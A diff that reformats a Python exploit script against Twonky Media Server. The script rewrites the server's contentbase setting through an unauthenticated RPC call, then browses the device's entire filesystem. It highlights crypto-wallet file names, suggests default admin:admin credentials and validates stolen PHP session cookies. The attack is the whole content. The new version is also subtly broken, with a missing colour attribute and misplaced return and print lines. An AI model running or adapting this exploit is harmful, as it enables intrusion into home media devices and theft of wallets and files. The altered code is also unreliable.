@@ -48,174 +48,187 @@
  * ------------------------------------------------------------------------------
 '''
 try:
-	import urllib3
-	import sys
-	import socket
-	import requests
-	from colorama import init, Fore
-except:
-	print ("Missing dependencies. Run 'sudo pip install -r requirements.txt'")
+    import sys
+    import socket
+    import requests
+    import urllib3
+except Exception:
+    print ("Missing dependencies. Run 'sudo pip install -r requirements.txt'")
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-init(autoreset=True)
+
+class Fore:
+    RED   = "\033[1;31m"
+    BLUE  = "\033[1;34m"
+    REVERSE = "\033[;7m"
+    GREEN = "\033[0;32m"
+    MAGENTA = "\033[35m"
+    END = '\033[1;37;0m'
+
+class Color(Fore):
+    pass
+
+def print_color(color, text):
+    print(color + text + Color.END)
 
 # Extend KEYWORDS, list if you want. This will highlight files and directory names that include a keyword.
 KEYWORDS = ["CRYPTO", "CRIPTO", "BITCOIN", "WALLET"]
+
 def warningFileName(line):
-        for keyword in KEYWORDS:
-                if line.upper().find(keyword) != -1:
-                        return True
+    for keyword in KEYWORDS:
+        if line.upper().find(keyword) != -1:
+            return True
         return False
+
 def checkPort(host, port):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-                s.connect((host,int(port)))
-                s.settimeout(2)
-                s.shutdown(2)
-                return True
-        except:
-                return False
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((host,int(port)))
+        s.settimeout(2)
+        s.shutdown(2)
+        return True
+    except Exception:
+        return False
 
 # Patch the contentbase parameter
 def setContentBase(host, port):
-        payload = "\ncontentbase=/../\n"
-        url = "http://{0}:{1}/rpc/set_all".format(host, port)
-        try:
-                response = requests.post(url, data=payload, timeout=5)
-        except requests.exceptions.ReadTimeout:
-                print (Fore.RED + "*** Timeout while setting contentbase path to '/' ***")
-        except requests.exceptions.ChunkedEncodingError:
-                print (Fore.RED + "*** 'contentbase' cannot be modified, password protection active ***")
-                sys.exit()
-        except requests.exceptions.ConnectionError:
-                url = "https://{0}:{1}/rpc/set_all".format(host, port)
-                response = requests.post(url, data=payload, timeout=5, verify=False)
-        if response.status_code != 200:
-                print (Fore.RED + "*** 'contentbase' cannot be modified, password protection active ***")
-                print (Fore.YELLOW + "*** You should try to login with admin:admin (default creds) ***")
-                sys.exit()
-        else:
-                print (Fore.MAGENTA + "*** 'contentbase' path set to '/../' ***")
-                return True
+    payload = "\ncontentbase=/../\n"
+    url = "http://{0}:{1}/rpc/set_all".format(host, port)
+    try:
+        response = requests.post(url, data=payload, timeout=5)
+    except requests.exceptions.ReadTimeout:
+        print_color(Fore.RED, "*** Timeout while setting contentbase path to '/' ***")
+    except requests.exceptions.ChunkedEncodingError:
+        print_color(Fore.RED, "*** 'contentbase' cannot be modified, password protection active ***")
+        sys.exit()
+    except requests.exceptions.ConnectionError:
+        url = "https://{0}:{1}/rpc/set_all".format(host, port)
+        response = requests.post(url, data=payload, timeout=5, verify=False)
+    if response.status_code != 200:
+        print_color(Fore.RED, "*** 'contentbase' cannot be modified, password protection active ***")
+        print_color(Fore.YELLOW, "*** You should try to login with admin:admin (default creds) ***")
+        sys.exit()
+    else:
+        print_color(Fore.MAGENTA, "*** 'contentbase' path set to '/../' ***")
+        return True
 
 # Get some information about the target device
 def serverInfo(host, port):
-        print (Fore.MAGENTA + "*** Get Serverdetails from Twonky ***")
-        try:
-                url = "http://{0}:{1}/rpc/get_friendlyname".format(host, port)
-                friendlyname = requests.get(url, timeout=5)
-        except requests.exceptions.ConnectionError:
-                url= "https://{0}:{1}/rpc/get_friendlyname".format(host, port)
-                friendlyname = requests.get(url, timeout=5, verify=False)
-        if friendlyname.status_code == 200:
-                print (Fore.GREEN + "Server Name: {0}".format(friendlyname.text))
-        else:
-                print (Fore.RED + "*** Not authorized to edit settings, password protection active ***")
-                sys.exit()
+    print_color(Fore.MAGENTA, "*** Get Serverdetails from Twonky ***")
+    try:
+        url = "http://{0}:{1}/rpc/get_friendlyname".format(host, port)
+        friendlyname = requests.get(url, timeout=5)
+    except requests.exceptions.ConnectionError:
+        url= "https://{0}:{1}/rpc/get_friendlyname".format(host, port)
+        friendlyname = requests.get(url, timeout=5, verify=False)
+    if friendlyname.status_code == 200:
+        print_color(Fore.GREEN, "Server Name: {0}".format(friendlyname.text))
+    else:
+        print_color(Fore.RED, "*** Not authorized to edit settings, password protection active ***")
+        sys.exit()
 
-        try:
-                url = "http://{0}:{1}/rpc/info_status".format(host, port)
-                infoStatus = requests.get(url, timeout=5)
-        except requests.exceptions.ConnectionError:
-                url = "https://{0}:{1}/rpc/info_status".format(host, port)
-                infoStatus = requests.get(url, timeout=5, verify=False)
-        for line in infoStatus.iter_lines():
-                line = line.decode("utf8")
-                if "version" in line:
-                        lineSplited = line.split("|")
-                        versionNumber = lineSplited[1]
-                        print (Fore.GREEN + "Twonky Version: {0}".format(versionNumber))
-                elif line.find("serverplatform") != -1:
-                        lineSplited = line.split("|")
-                        serverPlatform = lineSplited[1]
-                        print (Fore.GREEN + "Serverplatform: {0}".format(serverPlatform))
-                elif line.find("builddate") != -1:
-                        lineSplited = line.split("|")
-                        buildDate = lineSplited[1]
-                        print (Fore.GREEN + "Build date: {0}".format(buildDate))
-                elif line.find("pictures") != -1:
-                        lineSplited = line.split("|")
-                        pictureCount = lineSplited[1]
-                        print (Fore.GREEN + "Pictures shared: {0}".format(pictureCount))
-                elif line.find("videos") != -1:
-                        lineSplited = line.split("|")
-                        videoCount = lineSplited[1]
-                        print (Fore.GREEN + "Videos shared: {0}".format(videoCount))
-        return versionNumber
+    try:
+        url = "http://{0}:{1}/rpc/info_status".format(host, port)
+        infoStatus = requests.get(url, timeout=5)
+    except requests.exceptions.ConnectionError:
+        url = "https://{0}:{1}/rpc/info_status".format(host, port)
+        infoStatus = requests.get(url, timeout=5, verify=False)
+    for line in infoStatus.iter_lines():
+        line = line.decode("utf8")
+        if "version" in line:
+            lineSplited = line.split("|")
+            versionNumber = lineSplited[1]
+            print_color(Fore.GREEN, "Twonky Version: {0}".format(versionNumber))
+        elif line.find("serverplatform") != -1:
+            lineSplited = line.split("|")
+            serverPlatform = lineSplited[1]
+            print_color(Fore.GREEN, "Serverplatform: {0}".format(serverPlatform))
+        elif line.find("builddate") != -1:
+            lineSplited = line.split("|")
+            buildDate = lineSplited[1]
+            print_color(Fore.GREEN, "Build date: {0}".format(buildDate))
+        elif line.find("pictures") != -1:
+            lineSplited = line.split("|")
+            pictureCount = lineSplited[1]
+            print_color(Fore.GREEN, "Pictures shared: {0}".format(pictureCount))
+        elif line.find("videos") != -1:
+            lineSplited = line.split("|")
+            videoCount = lineSplited[1]
+            print_color(Fore.GREEN, "Videos shared: {0}".format(videoCount))
+    return versionNumber
 
 # Check if the discovered Cookie is a valid PHP Session identifier for WD api
 def checkSessionCookie(host, cookieString):
-        url = "http://{0}/api/2.1/rest/device_user".format(host)
-        cookieTemp = cookieString.split("_")
-        cookie = {'PHPSESSID': cookieTemp[1]}
-        response = requests.get(url, timeout=10, cookies=cookie)
-        if response.status_code == 200:
-                return cookie
-        else:
-                return False
+    url = "http://{0}/api/2.1/rest/device_user".format(host)
+    cookieTemp = cookieString.split("_")
+    cookie = {'PHPSESSID': cookieTemp[1]}
+    response = requests.get(url, timeout=10, cookies=cookie)
+    if response.status_code == 200:
+        return cookie
+    else:
+        return False
 
-# Function for browsing
 def browser(host, port, version):
-        def do_request(host, port, var):
-            if version[0] == "8":
-                    url = "http://{0}:{1}/rpc/dir?path={2}".format(host, port, var)
-            else:
-                    url = "http://{0}:{1}/rpc/dir/path={2}".format(host, port, var)
-            try:
-                    response = requests.get(url, timeout=5)
-            except requests.exceptions.ConnectionError:
-                    if version[0] == "8":
-                            url = "https://{0}:{1}/rpc/dir?path={2}".format(host, port, var)
-                    else:
-                            url = "https://{0}:{1}/rpc/dir/path={2}".format(host, port, var)
-                    response = requests.get(url, timeout=5, verify=False)
-            return response
-
-        def print_item(id, type, name):
-            if warningFileName(name):
-                print (id, Fore.RED + type, name)
-            else:
-                print(id, Fore.GREEN + type, name)
-
-        def extract_type_name(line):
-            filetypes = {'D': 'Dir', 'F': 'File'}
-            id = line[0:3]
-            type = line[3]
-            name = line[4:]
-            return id, filetypes[type], name
-
-        def do_print_results(content, path, path_id):
-            for line in content:
-                    line = line.decode("utf8")
-                    if line and len(line) > 3 :
-                        id, type, name = extract_type_name(line)
-                        print_item(id, type, path + "/" + name)
-                        if type == 'Dir':
-                            next_path = path + "/" + name
-                            next_path_id = path_id + "/" + id
-                            response = do_request(host, port, next_path_id)
-                            do_print_results(response.iter_lines(), next_path, next_path_id)
-
-        while True:
-            path = input("path nr: ")
-            if path == "exit":
-                    sys.exit()
-            response = do_request(host, port, path)
-            print ("-" * 30)
-            do_print_results(response.iter_lines(), "", "")
-
-#*** Program start here ***
-if __name__ == '__main__':
-        if len(sys.argv) != 3:
-                print ("Usage: $ " + sys.argv[0] + " [IP_adress] [port]")
+    def do_request(host, port, var):
+        if version[0] == "8":
+            url = "http://{0}:{1}/rpc/dir?path={2}".format(host, port, var)
         else:
-                host = sys.argv[1]
-                print (Fore.MAGENTA + "https://www.shodan.io/host/{0}".format(host))
-                port = sys.argv[2]
-                if checkPort(host, port):
-                        print (Fore.GREEN + "*** Port {0} opened ***".format(port))
-                        twonky = input("Run Twonky browser on port {0} [Y, N]? [Y] ".format(port))
-                        if twonky.upper() != "N":
-                                version = serverInfo(host, port)
-                                if setContentBase(host, port):
-                                        browser(host, port, version)
+            url = "http://{0}:{1}/rpc/dir/path={2}".format(host, port, var)
+        try:
+            response = requests.get(url, timeout=5)
+        except requests.exceptions.ConnectionError:
+            if version[0] == "8":
+                url = "https://{0}:{1}/rpc/dir?path={2}".format(host, port, var)
+            else:
+                url = "https://{0}:{1}/rpc/dir/path={2}".format(host, port, var)
+            response = requests.get(url, timeout=5, verify=False)
+        return response
+
+    def print_item(id, type, name):
+        if warningFileName(name):
+            print (id, Fore.RED + type, name)
+        else:
+            print(id, Fore.GREEN + type, name)
+
+    def extract_type_name(line):
+        filetypes = {'D': 'Dir', 'F': 'File'}
+        id = line[0:3]
+        type = line[3]
+        name = line[4:]
+        return id, filetypes[type], name
+
+    def do_print_results(content, path, path_id):
+        for line in content:
+            line = line.decode("utf8")
+            if line and len(line) > 3 :
+                id, type, name = extract_type_name(line)
+            print_item(id, type, path + "/" + name)
+            if type == 'Dir':
+                next_path = path + "/" + name
+                next_path_id = path_id + "/" + id
+                response = do_request(host, port, next_path_id)
+                do_print_results(response.iter_lines(), next_path, next_path_id)
+
+    while True:
+        path = input("path nr: ")
+        if path == "exit":
+            sys.exit()
+        response = do_request(host, port, path)
+        print ("-" * 30)
+        do_print_results(response.iter_lines(), "", "")
+
+
+if __name__ == '__main__':
+    if len(sys.argv) != 3:
+        print ("Usage: $ " + sys.argv[0] + " [IP_adress] [port]")
+    else:
+        host = sys.argv[1]
+        print_color(Fore.MAGENTA, "https://www.shodan.io/host/{0}".format(host))
+        port = sys.argv[2]
+        if checkPort(host, port):
+            print_color(Fore.GREEN, "*** Port {0} opened ***".format(port))
+            twonky = input("Run Twonky browser on port {0} [Y, N]? [Y] ".format(port))
+            if twonky.upper() != "N":
+                version = serverInfo(host, port)
+                if setContentBase(host, port):
+                    browser(host, port, version)
